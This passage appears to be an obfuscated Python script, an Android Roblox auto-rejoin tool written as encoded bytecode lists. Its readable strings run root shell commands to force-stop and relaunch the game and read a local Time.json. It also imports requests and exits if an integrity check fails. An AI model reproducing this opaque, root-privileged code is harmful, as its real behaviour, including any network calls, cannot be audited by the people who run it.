190, 9, 29, 191, 190, 19, 190, 21, 125, 102, 253, 30, 247, 2, 92, 1, 92, 1, 29, 153, 89, 22, 92, 0, 29, 81, 202, 133, 35, 3, 29, 12, 190, 23, 35, 0, 184, 106, 130, 0, 190, 23, 202, 135, 59, 0, 232, 106, 125, 225, 130, 3, 89, 24, 92, 0, 160, 0, 246, 104, 35, 4, 130, 4, 89, 25, 190, 3, 10, 51, 89, 4, 130, 2, 190, 26, 125, 218, 233, 0, 190, 27, 190, 28, 190, 20, 190, 29, 29, 85, 29, 111, 190, 28, 190, 30, 29, 190, 190, 31, 190, 32, 253, 8, 29, 152, 247, 2, 10, 213, 202, 252, 92, 1, 190, 3, 92, 2, 202, 151, 10, 200, 89, 33, 92, 0, 10, 60, 125, 147, 35, 5, 125, 253, 202, 48, 130, 1, 89, 34, 10, 160, 190, 3, 89, 4, 190, 35, 130, 6, 10, 136, 130, 5, 247, 1, 125, 97, 190, 36, 253, 3, 92, 1, 92, 1, 111, 0, 184, 65, 202, 246, 190, 1, 35, 0, 29, 115, 202, 20, 184, 2, 202, 152, 165, 0], 'NbmLvVPl_QHrSn5Af': [106, 231, 'popen', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [125, 253, 125, 123, 130, 0, 29, 241, 80, 0, 190, 0, 29, 55, 199, 0, 247, 1, 202, 247, 202, 97, 149, 0], 'NbmLvVPl_QHrSn5Af': [22], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 102, 123, 54, 122, 127, 101, 98, 119, 117, 125, 113, 115, 100, 121, 116, 110, 'read', 217, 'splitlines', 'replace', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 125, 148, 125, 1, 190, 0, 199, 0, 29, 170, 247, 1, 29, 105, 149, 0], 'NbmLvVPl_QHrSn5Af': [23], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 103, 118, 124, 112, 114, 45, 'strip', 'system', "su -c 'am force-stop ", "'"], 'FcvQsFUf_U4XrAs9K': ['EWXHTyKr_jT83NVQK', 'os', 'map', 'DZkAuMZf_z92iPe3H', 'LhfACvQj_Zy5g0PQs', 'wfIRruUo_JoYp9YEy', 'str'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [190, 0, 35, 0, 29, 100, 130, 0, 29, 230, 190, 1, 10, 253, 156, 0, 232, 129, 10, 192, 125, 217, 130, 0, 190, 0, 59, 0, 10, 195, 232, 61, 130, 1, 29, 181, 89, 2, 202, 217, 190, 3, 89, 4, 130, 2, 10, 77, 10, 238, 190, 5, 233, 0, 29, 167, 190, 6, 29, 194, 10, 38, 190, 7, 190, 8, 10, 152, 125, 161, 190, 9, 125, 137, 29, 163, 190, 10, 190, 11, 190, 12, 190, 8, 29, 95, 10, 88, 190, 6, 190, 13, 125, 35, 190, 14, 190, 15, 190, 13, 190, 16, 190, 17, 190, 11, 190, 8, 190, 18, 190, 8, 190, 16, 190, 19, 10, 250, 10, 206, 190, 17, 190, 6, 125, 249, 10, 148, 190, 8, 202, 17, 29, 28, 190, 19, 125, 227, 125, 160, 190, 20, 29, 12, 202, 81, 190, 21, 190, 9, 190, 20, 125, 194, 190, 22, 253, 30, 10, 181, 247, 2, 10, 86, 125, 62, 92, 1, 202, 83, 10, 172, 92, 1, 89, 23, 10, 88, 92, 0, 89, 24, 202, 125, 92, 0, 35, 3, 253, 0, 35, 4, 125, 253, 29, 8, 190, 25, 35, 0, 184, 128, 130, 0, 125, 185, 190, 25, 59, 0, 29, 149, 29, 80, 232, 122, 130, 3, 89, 26, 202, 224, 125, 238, 92, 0, 202, 162, 125, 29, 160, 0, 246, 119, 29, 165, 29, 104, 35, 5, 10, 144, 125, 187, 190, 3, 125, 80, 89, 4, 10, 193, 130, 2, 190, 27, 29, 69, 233, 0, 202, 93, 29, 207, 190, 28, 29, 77, 190, 29, 125, 117, 190, 30, 190, 31, 190, 29, 10, 7, 10, 234, 190, 32, 190, 33, 125, 212, 29, 80, 190, 17, 125, 249, 253, 8, 247, 2, 92, 1, 130, 5, 125, 60, 245, 0, 232, 118, 130, 5, 29, 204, 89, 34, 10, 192, 202, 215, 190, 3, 89, 4, 130, 2, 125, 230, 190, 35, 233, 0, 190, 6, 190, 13, 190, 14, 125, 19, 10, 35, 190, 15, 190, 13, 190, 16, 190, 17, 190, 33, 253, 8, 10, 191, 29, 73, 247, 2, 92, 1, 125, 45, 190, 3, 92, 2, 89, 24, 92, 0, 29, 198, 29, 159, 35, 6, 130, 4, 89, 36, 202, 239, 202, 216, 130, 6, 92, 1, 111, 0, 29, 146, 29, 35, 184, 69, 190, 37, 35, 0, 184, 128, 130, 0, 190, 37, 59, 0, 125, 93, 232, 128, 130, 4, 149, 0, 10, 230, 184, 2, 125, 121, 165, 0], 'NbmLvVPl_QHrSn5Af': [219, 208, 'popen', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 125, 81, 125, 231, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [16], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 96, 125, 48, 124, 121, 99, 100, 113, 115, 123, 119, 117, 108, 98, 127, 114, 104, 'read', 'strip', 239, 'splitlines', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 125, 135, 29, 149, 80, 0, 190, 0, 199, 0, 125, 118, 247, 1, 125, 26, 10, 145, 149, 0], 'NbmLvVPl_QHrSn5Af': [79], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 63, 46, 44, 36, 40, 42, 'replace', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 29, 130, 10, 149, 199, 0, 247, 1, 202, 58, 149, 0], 'NbmLvVPl_QHrSn5Af': [16], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 'append', 159], 'FcvQsFUf_U4XrAs9K': ['EdNMbKZh_cFib98ce', 'os', 'map', 'DZkAuMZf_z92iPe3H', 'ysLHnjOS_IkcNJIGj', 'LhfACvQj_Zy5g0PQs', 'wfIRruUo_JoYp9YEy'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 95, 202, 40, 190, 0, 35, 0, 125, 26, 130, 0, 190, 1, 156, 0, 232, 78, 130, 0, 190, 0, 59, 0, 232, 49, 190, 2, 89, 3, 29, 82, 190, 4, 125, 201, 130, 1, 80, 0, 247, 1, 253, 2, 92, 1, 35, 2, 202, 143, 202, 227, 130, 3, 190, 2, 89, 3, 130, 4, 202, 186, 125, 238, 190, 5, 29, 6, 125, 74, 233, 0, 125, 21, 10, 202, 190, 6, 202, 158, 29, 136, 190, 7, 190, 8, 190, 9, 190, 10, 10, 102, 202, 79, 190, 11, 190, 12, 190, 10, 202, 100, 125, 40, 190, 9, 10, 171, 190, 7, 202, 21, 190, 11, 10, 104, 190, 13, 190, 14, 29, 53, 10, 102, 253, 13, 29, 202, 247, 2, 92, 1, 247, 1, 125, 85, 125, 190, 111, 0, 130, 5, 247, 0, 35, 6, 190, 15, 202, 22, 35, 0, 29, 26, 184, 77, 130, 0, 10, 188, 125, 114, 190, 15, 29, 167, 59, 0, 125, 170, 232, 77, 202, 89, 130, 6, 202, 26, 160, 0, 125, 169, 202, 181, 246, 75, 10, 199, 35, 7, 130, 8, 89, 16, 190, 2, 89, 3, 190, 17, 130, 1, 130, 7, 247, 1, 125, 183, 190, 18, 130, 1, 130, 2, 247, 1, 190, 19, 29, 242, 253, 5, 92, 1, 92, 1, 125, 225, 125, 43, 111, 0, 29, 37, 125, 43, 184, 55, 29, 12, 190, 1, 125, 247, 202, 98, 35, 0, 184, 2, 10, 84, 165, 0], 'NbmLvVPl_QHrSn5Af': [90, 23, '', 'join', 'roblox://placeId=', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 29, 29, 29, 175, 80, 0, 202, 227, 10, 235, 190, 0, 202, 38, 199, 0, 247, 1, 125, 61, 149, 0], 'NbmLvVPl_QHrSn5Af': [41], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 313, 72, 71, 78, 9, 68, 7926, 76, 19, 46, 'system', "su -c 'am start -n ", '/com.roblox.client.ActivityProtocolLaunch -d "', '"\' > /dev/null 2>&1'], 'FcvQsFUf_U4XrAs9K': ['GXAYOVNF_I2j6uQaU', 'str', 'zKMkhjYh_LV5z1XIb', 'print', 'map', 'iVbjOCPF_aEawyRGV', 'ysLHnjOS_IkcNJIGj', 'wfIRruUo_JoYp9YEy', 'os'], 'fhuctOnk_99WtMbd3': ['place_id'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [190, 0, 35, 0, 130, 0, 190, 1, 29, 187, 125, 173, 156, 0, 232, 54, 130, 0, 190, 0, 10, 195, 59, 0, 232, 17, 29, 46, 125, 171, 130, 1, 125, 128, 80, 0, 247, 1, 35, 2, 190, 2, 10, 102, 29, 158, 35, 0, 184, 53, 130, 0, 190, 2, 59, 0, 232, 30, 10, 81, 130, 2, 190, 3, 125, 228, 29, 16, 59, 0, 125, 249, 232, 27, 29, 145, 190, 4, 149, 0, 10, 91, 190, 5, 35, 0, 184, 53, 29, 211, 130, 0, 29, 63, 190, 5, 202, 202, 10, 255, 59, 0, 232, 43, 130, 3, 29, 112, 130, 4, 89, 6, 92, 0, 10, 163, 10, 176, 247, 1, 10, 2, 10, 216, 35, 5, 190, 7, 202, 107, 10, 190, 35, 0, 184, 53, 130, 0, 29, 100, 125, 10, 190, 7, 10, 153, 59, 0, 125, 94, 232, 53, 10, 141, 29, 220, 130, 5, 130, 2, 125, 219, 125, 201, 24, 0, 190, 8, 202, 85, 171, 0, 149, 0, 10, 152, 184, 2, 29, 45, 165, 0], 'NbmLvVPl_QHrSn5Af': [176, 225, 217, 0, False, 57, 'time', 108, 90], 'FcvQsFUf_U4XrAs9K': ['cyfbZpwH_oFMWJ1bw', 'lyVHsuav_kRoCOnsk', 'siLxZRCv_stRAxO6u', 'int', 'time', 'bShStDUr_RWtgMU4m'], 'fhuctOnk_99WtMbd3': ['file_path'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [190, 0, 35, 0, 202, 140, 130, 0, 190, 1, 10, 114, 29, 47, 156, 0, 125, 226, 232, 214, 202, 20, 130, 0, 29, 184, 125, 111, 190, 0, 125, 108, 10, 46, 59, 0, 29, 179, 232, 145, 130, 1, 202, 150, 247, 0, 111, 0, 130, 2, 247, 0, 35, 3, 125, 230, 130, 4, 190, 2, 89, 3, 190, 4, 29, 21, 10, 6, 130, 5, 130, 3, 202, 235, 29, 242, 247, 1, 190, 5, 253, 3, 92, 1, 247, 1, 111, 0, 125, 55, 190, 2, 202, 109, 89, 3, 10, 216, 130, 6, 29, 134, 190, 6, 29, 185, 233, 0, 202, 173, 190, 7, 190, 7, 29, 52, 125, 66, 190, 8, 29, 141, 190, 9, 190, 10, 29, 84, 125, 35, 190, 11, 10, 254, 10, 240, 190, 7, 10, 83, 190, 12, 10, 21, 202, 24, 190, 9, 10, 97, 253, 9, 29, 182, 247, 2, 202, 88, 92, 1, 190, 2, 89, 3, 130, 6, 190, 13, 202, 232, 233, 0, 190, 14, 190, 15, 190, 16, 190, 17, 190, 16, 190, 18, 10, 38, 190, 16, 190, 19, 190, 14, 253, 9, 125, 39, 247, 2, 92, 1, 190, 2, 89, 3, 130, 6, 190, 20, 233, 0, 190, 21, 190, 22, 190, 23, 190, 24, 190, 21, 190, 21, 10, 142, 190, 25, 190, 26, 190, 23, 202, 189, 190, 27, 190, 27, 10, 217, 29, 238, 253, 11, 202, 118, 247, 2, 29, 81, 125, 151, 92, 1, 29, 6, 202, 158, 190, 2, 89, 3, 130, 6, 125, 213, 29, 69, 190, 28, 233, 0, 29, 171, 190, 29, 190, 8, 202, 226, 10, 190, 190, 30, 190, 9, 190, 8, 190, 29, 190, 31, 10, 139, 190, 10, 190, 30, 190, 10, 190, 8, 253, 11, 247, 2, 92, 1, 253, 4, 35, 7, 130, 8, 190, 2, 202, 104, 89, 3, 130, 6, 190, 32, 233, 0, 29, 177, 190, 33, 125, 56, 202, 37, 190, 34, 190, 35, 190, 36, 190, 37, 202, 106, 202, 224, 190, 38, 29, 129, 190, 39, 125, 232, 190, 40, 190, 37, 190, 38, 125, 212, 125, 181, 190, 41, 125, 46, 10, 21, 190, 42, 29, 42, 10, 11, 190, 37, 190, 43, 29, 115, 29, 154, 190, 34, 190, 44, 190, 45, 190, 40, 29, 108, 190, 37, 190, 46, 190, 37, 29, 86, 202, 136, 253, 21, 125, 237, 247, 2, 125, 27, 29, 79, 92, 1, 247, 1, 10, 2, 35, 9, 125, 43, 202, 188, 190, 47, 233, 0, 247, 0, 35, 10, 29, 131, 190, 48, 233, 0, 247, 0, 35, 11, 190, 49, 35, 0, 184, 213, 130, 0, 202, 53, 190, 49, 59, 0, 202, 151, 232, 213, 190, 50, 232, 211, 130, 12, 190, 51, 233, 0, 247, 0, 247, 1, 35, 13, 130, 13, 125, 41, 202, 238, 232, 188, 130, 14, 10, 12, 125, 118, 247, 0, 111, 0, 125, 55, 130, 15, 89, 52, 190, 36, 92, 1, 111, 0, 130, 16, 89, 53, 10, 12, 10, 209, 130, 7, 29, 129, 92, 1, 35, 17, 130, 18, 29, 212, 190, 54, 202, 130, 10, 246, 247, 1, 29, 58, 29, 102, 160, 0, 10, 192, 125, 79, 246, 188, 10, 220, 35, 19, 29, 150, 125, 99, 130, 20, 130, 17, 247, 1, 29, 149, 10, 186, 111, 0, 125, 116, 130, 15, 202, 189, 202, 232, 89, 52, 190, 55, 29, 241, 10, 181, 92, 1, 202, 238, 111, 0, 184, 176, 130, 15, 89, 52, 190, 56, 92, 1, 111, 0, 130, 21, 10, 44, 202, 252, 89, 57, 29, 190, 190, 2, 202, 73, 89, 3, 130, 6, 190, 58, 233, 0, 29, 205, 190, 59, 125, 97, 125, 93, 190, 60, 190, 61, 190, 62, 202, 174, 29, 23, 190, 8, 29, 46, 202, 131, 253, 5, 247, 2, 92, 1, 92, 1, 111, 0, 184, 149, 190, 1, 202, 131, 125, 12, 35, 0, 125, 247, 184, 2, 125, 158, 165, 0], 'NbmLvVPl_QHrSn5Af': [129, 210, '', 'join', '\nBạn đã chọn Client: ', '\n', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 202, 98, 125, 222, 80, 0, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [66], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 116, 112, 118, 115, 117, 122, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 29, 82, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [96], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 81, 84, 82, 88, 83, 89, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [202, 220, 29, 242, 130, 0, 202, 207, 80, 0, 29, 112, 125, 249, 190, 0, 125, 2, 199, 0, 10, 98, 202, 76, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [116], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 69, 76, 77, 68, 66, 65, 70, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 125, 81, 29, 212, 80, 0, 190, 0, 199, 0, 202, 155, 247, 1, 202, 39, 149, 0], 'NbmLvVPl_QHrSn5Af': [64], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 113, 114, 121, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [202, 240, 130, 0, 80, 0, 190, 0, 199, 0, 10, 204, 247, 1, 29, 81, 202, 60, 149, 0], 'NbmLvVPl_QHrSn5Af': [117], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 59, 29, 7896, 5, 85, 1, 159, 27, 149, 28, 30, 26, 7894, 79, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 112, 29, 224, 253, 0, 35, 0, 130, 1, 89, 0, 190, 1, 125, 163, 89, 2, 130, 2, 125, 62, 190, 3, 233, 0, 29, 42, 125, 138, 190, 4, 253, 1, 247, 2, 92, 1, 92, 1, 125, 209, 160, 0, 246, 30, 35, 3, 29, 47, 130, 3, 89, 5, 92, 0, 232, 29, 29, 27, 130, 0, 89, 6, 29, 187, 130, 3, 202, 70, 10, 54, 89, 5, 10, 166, 125, 129, 92, 0, 92, 1, 202, 164, 202, 15, 111, 0, 184, 15, 184, 15, 10, 59, 130, 0, 149, 0], 'NbmLvVPl_QHrSn5Af': ['split', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 199, 0, 10, 88, 10, 163, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [6], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 42, 'strip', 'append'], 'FcvQsFUf_U4XrAs9K': ['__cr', 'aYwpejjY_HHZeJZke', 'map', 'uiPbcyVi_KOCZXUEi'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 19, 125, 75, 253, 0, 35, 0, 130, 1, 160, 0, 10, 47, 246, 24, 35, 2, 29, 229, 29, 110, 130, 0, 89, 0, 190, 1, 89, 2, 190, 3, 130, 3, 130, 4, 202, 102, 29, 96, 247, 1, 190, 4, 125, 225, 125, 156, 130, 3, 130, 2, 247, 1, 190, 5, 125, 138, 253, 5, 10, 94, 92, 1, 92, 1, 111, 0, 125, 36, 125, 231, 184, 4, 130, 0, 149, 0], 'NbmLvVPl_QHrSn5Af': ['append', '', 'join', '/storage/emulated/0/', '/Workspace/rj/', '/Time.json'], 'FcvQsFUf_U4XrAs9K': ['__cr', 'LuIWYVLl_RwkXtPD5', 'jEqqYzhg_ybnqwqRO', 'str', 'OhxzQCnh_Non9JTlT'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, 23, True, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [253, 0, 35, 0, 130, 1, 29, 75, 160, 0, 246, 14, 35, 2, 29, 216, 130, 0, 29, 67, 89, 0, 130, 3, 130, 2, 247, 1, 92, 1, 10, 14, 10, 231, 111, 0, 10, 21, 125, 213, 184, 4, 202, 187, 10, 118, 130, 0, 10, 163, 149, 0], 'NbmLvVPl_QHrSn5Af': ['append'], 'FcvQsFUf_U4XrAs9K': ['__cr', 'ucrKBwMi_lSdKNoBI', 'LIQenDDD_sLxg4HGu', 'PMXXZiIT_Tjm4CkHK'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, 'sleep', 'choice', 6, 0.1, 60, 'system', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 10, 46, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [2], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 97, 110, 103, 99], 'FcvQsFUf_U4XrAs9K': ['kKlZVpQn_EqjR378m', 'qEUAMadB_1YRWrNqh', 'BMfRhEYf_oOQcrd9J', 'OhxzQCnh_Non9JTlT', 'print', 'str', 'map', 'VqWhjXLY_9IG6BXgp', 'input', 'aYwpejjY_HHZeJZke', 'LuIWYVLl_RwkXtPD5', 'ucrKBwMi_lSdKNoBI', 'any', 'EbuTghNM_Teeq9dpK', 'vImBeJym_MJ4w1oXp', 'time', 'random', 'akAjdJoA_lyucXKLg', 'range', 'PxmWiNqt_4p8KdQaR', 'vGLFefwY_OqKyoZEP', 'os'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 125, 130, 0, 80, 0, 190, 0, 125, 73, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [93], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 2, 52], 'FcvQsFUf_U4XrAs9K': ['os', 'time', 'random', 'json', 'hashlib', 'subprocess', 'requests', 'map', 'xxeJNQAy_Luz2m7L2', 'TVLQcftB_gWMXx7wE', 'SEDsaGYM_jXRfBvRw', 'GALnZkXq_TF8BWmKt', 'cqeyTKeO_EIO5scZ0', 'qEUAMadB_1YRWrNqh', 'BMfRhEYf_oOQcrd9J', 'lyVHsuav_kRoCOnsk', 'vImBeJym_MJ4w1oXp', 'iVbjOCPF_aEawyRGV', 'vGLFefwY_OqKyoZEP', 'PMXXZiIT_Tjm4CkHK', 'dvUxkYWV_hvloqIZK', '__name__'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []})!=hKCfvdOb_ltuSDKvz:__import__("sys").exit()
+elibSAcn_H4sh6bs5=48213^21068
+DsyaXFwS_WvDWEcUO={'rbc': [158, 0, 0, 0, 158, 1, 1, 0, 158, 2, 2, 0, 167, 7, 223, 163, 167, 5, 207, 119, 151, 3, 2, 0, 192, 3, 0, 0], 'rco': [{'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [238, 0, 125, 41, 35, 0, 238, 1, 10, 13, 202, 49, 35, 1, 238, 2, 125, 111, 35, 2, 29, 0, 10, 169, 238, 3, 35, 3, 238, 4, 29, 179, 29, 1, 35, 4, 238, 5, 10, 232, 35, 5, 238, 6, 35, 6, 190, 7, 202, 129, 89, 8, 130, 7, 190, 9, 202, 244, 125, 217, 233, 0, 190, 10, 10, 164, 202, 78, 190, 11, 190, 11, 125, 24, 202, 24, 190, 12, 10, 55, 190, 13, 190, 14, 190, 15, 190, 15, 190, 16, 29, 135, 202, 82, 190, 11, 190, 11, 190, 17, 202, 75, 190, 18, 125, 22, 190, 19, 125, 104, 125, 225, 190, 16, 190, 13, 190, 19, 125, 208, 125, 173, 190, 20, 29, 91, 202, 191, 190, 21, 125, 189, 190, 22, 190, 12, 125, 182, 190, 23, 190, 24, 125, 88, 125, 71, 190, 21, 190, 13, 190, 22, 190, 25, 190, 21, 190, 26, 190, 15, 190, 27, 190, 13, 10, 135, 10, 47, 190, 21, 10, 41, 190, 28, 190, 13, 190, 15, 10, 88, 190, 10, 190, 29, 202, 105, 125, 100, 190, 30, 125, 220, 190, 25, 29, 35, 190, 22, 29, 23, 29, 60, 190, 31, 190, 13, 190, 19, 10, 49, 190, 16, 202, 246, 125, 83, 253, 45, 125, 166, 29, 90, 247, 2, 29, 111, 202, 236, 92, 1, 125, 20, 202, 127, 35, 8, 130, 6, 89, 32, 29, 56, 130, 8, 92, 1, 202, 0, 125, 82, 89, 3, 92, 0, 29, 216, 202, 134, 35, 9, 29, 251, 253, 0, 35, 10, 10, 163, 130, 9, 89, 33, 92, 0, 160, 0, 246, 105, 35, 11, 125, 73, 10, 234, 130, 10, 89, 34, 130, 11, 89, 32, 190, 7, 202, 149, 89, 8, 130, 7, 10, 123, 190, 35, 233, 0, 190, 36, 190, 37, 190, 38, 190, 39, 190, 40, 253, 5, 202, 47, 247, 2, 92, 1, 253, 0, 92, 2, 10, 122, 92, 1, 111, 0, 184, 81, 190, 41, 29, 92, 29, 0, 233, 0, 35, 12, 125, 218, 190, 42, 233, 0, 35, 13, 29, 24, 10, 4, 190, 43, 29, 217, 233, 0, 202, 197, 35, 14, 190, 44, 233, 0, 35, 15, 190, 45, 233, 0, 125, 195, 35, 16, 190, 46, 29, 104, 10, 35, 233, 0, 10, 23, 29, 179, 35, 17, 190, 47, 233, 0, 35, 18, 190, 48, 233, 0, 125, 57, 35, 19, 190, 49, 233, 0, 35, 20, 130, 21, 190, 7, 125, 36, 10, 93, 89, 8, 29, 239, 130, 7, 190, 50, 233, 0, 190, 51, 125, 134, 10, 53, 190, 51, 190, 30, 125, 149, 190, 21, 190, 52, 190, 31, 190, 51, 190, 51, 253, 8, 10, 182, 247, 2, 92, 1, 59, 0, 29, 51, 29, 4, 232, 154, 130, 20, 202, 69, 247, 0, 29, 177, 202, 46, 111, 0, 165, 0], 'NbmLvVPl_QHrSn5Af': ['os', 'time', 'random', 'json', 'hashlib', 'subprocess', 'requests', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 29, 165, 190, 0, 199, 0, 247, 1, 29, 196, 149, 0], 'NbmLvVPl_QHrSn5Af': [89], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 49, 45, 41, 42, 99, 118, 55, 116, 58, 54, 53, 60, 119, 56, 62, 61, 47, 44, 43, 46, 48, 51, 'get', 'values', 'extend', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 125, 245, 80, 0, 10, 179, 125, 35, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [55], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 95, 64, 94, 83, 68, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 10, 24, 125, 137, 89, 0, 190, 1, 89, 2, 130, 1, 190, 3, 29, 84, 233, 0, 190, 4, 190, 5, 10, 212, 190, 6, 125, 208, 190, 7, 190, 8, 190, 9, 10, 101, 125, 204, 190, 7, 10, 80, 202, 114, 190, 10, 190, 8, 125, 173, 190, 9, 10, 97, 190, 11, 190, 12, 125, 95, 190, 5, 202, 255, 202, 55, 190, 8, 10, 126, 190, 13, 190, 14, 190, 15, 29, 48, 190, 16, 190, 9, 29, 30, 202, 93, 253, 19, 247, 2, 92, 1, 190, 17, 190, 18, 115, 1, 202, 78, 125, 224, 1, 1, 10, 73, 89, 19, 29, 182, 92, 0, 125, 247, 89, 20, 92, 0, 10, 116, 35, 2, 29, 246, 202, 226, 130, 0, 202, 90, 89, 0, 190, 1, 202, 86, 202, 67, 89, 2, 10, 11, 10, 41, 130, 1, 190, 21, 10, 124, 202, 31, 233, 0, 190, 22, 29, 174, 190, 23, 10, 120, 190, 24, 190, 25, 190, 26, 10, 213, 29, 210, 190, 27, 190, 25, 190, 28, 190, 26, 190, 27, 190, 16, 190, 25, 202, 208, 29, 252, 190, 26, 125, 175, 190, 27, 202, 147, 125, 56, 190, 29, 125, 135, 10, 176, 190, 30, 190, 31, 125, 174, 190, 24, 10, 157, 125, 218, 190, 16, 190, 32, 190, 27, 190, 29, 202, 38, 190, 23, 190, 33, 253, 24, 247, 2, 92, 1, 190, 17, 29, 121, 190, 18, 115, 1, 1, 1, 10, 59, 89, 19, 92, 0, 89, 20, 92, 0, 125, 210, 35, 3, 10, 199, 190, 1, 89, 2, 29, 35, 130, 4, 202, 170, 29, 153, 130, 2, 247, 1, 190, 34, 130, 4, 10, 221, 130, 3, 29, 198, 247, 1, 125, 207, 253, 3, 125, 29, 125, 44, 92, 1, 35, 5, 130, 6, 10, 58, 89, 35, 130, 5, 89, 36, 10, 60, 92, 0, 92, 1, 89, 37, 92, 0, 35, 7, 29, 228, 130, 7, 125, 122, 149, 0], 'NbmLvVPl_QHrSn5Af': ['check_output', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 125, 176, 125, 82, 190, 0, 125, 212, 125, 87, 199, 0, 29, 37, 247, 1, 10, 184, 125, 246, 149, 0], 'NbmLvVPl_QHrSn5Af': [124], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 27, 25, 8, 12, 14, 19, 92, 82, 15, 21, 29, 16, 18, 'shell', True, 'decode', 